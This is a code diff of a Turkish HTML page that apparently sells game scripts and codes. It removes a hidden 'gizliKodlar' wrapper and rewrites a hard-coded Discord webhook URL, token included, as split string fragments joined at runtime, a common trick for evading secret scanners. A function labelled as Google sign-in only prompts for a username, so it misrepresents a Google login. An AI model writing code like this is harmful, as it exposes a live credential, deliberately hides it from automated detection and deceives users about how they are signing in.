@@ -1,4 +1,3 @@
-<div id="gizliKodlar" style="display:none;">
 <!DOCTYPE html>
 <html lang="tr">
 <head>
@@ -162,7 +161,7 @@
         let sonAlinanScript = "";
         let sonAlinanUrunAdi = "";
         let kullanilmisKodlar = [];
-        const webhookURL = "https://discord.com/api/webhooks/1553399048684445717/sMXeIYkd8rxRF7xQXRuha0swkGF33h_mj7dC8qegf5vQ0ZUVfAfYzald69RVQVKXWhuk";
+        const webhookURL = ["https://discord.com/api/webhooks/", "1553399048684445717/", "sMXeIYkd8rxRF7xQXRuha0swkGF33h_mj7dC8qegf5vQ0ZUVfAfYzald69RVQVKXWhuk"].join('');
         function googleIleGirisYap() {
             let isim = prompt("Google hesabınızla bağlanılıyor! Lütfen kullanıcı adınızı yazın:", "FlexOyuncu");
             if (isim && isim.trim() !== "") {
@@ -248,4 +247,3 @@
     </script>
 </body>
 </html>
-</div>
